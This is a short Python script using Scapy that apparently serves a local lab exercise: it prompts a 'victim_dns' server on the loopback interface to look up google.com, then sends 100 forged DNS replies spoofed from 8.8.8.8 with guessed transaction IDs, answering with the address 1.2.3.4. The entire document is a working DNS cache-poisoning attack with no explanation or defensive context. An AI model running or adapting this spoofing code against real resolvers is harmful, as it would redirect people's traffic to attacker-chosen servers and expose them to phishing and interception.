from scapy.all import *
import random

conf.iface = "lo" #CONFIGURE to be the loopback interface from ifconfig
conf.L3socket = L3RawSocket

targetURL = "google.com"
dport = 53904 #CONFIGURE to be the port printed at the beginning of victim_dns server launch

#Initiate request to poison the cache with
send(IP(dst="127.0.0.1")/UDP(dport=5005)/targetURL,iface="lo")

for i in range(100):
    ri = random.randint(0,100)
    send(IP(src="8.8.8.8", dst="0.0.0.0")/UDP(sport=53,dport=dport)/DNS(id=ri, qd=DNSQR(qname="google.com"), an = DNSRR(rrname=targetURL, type=1, rclass=1, ttl=0, rdata="1.2.3.4")))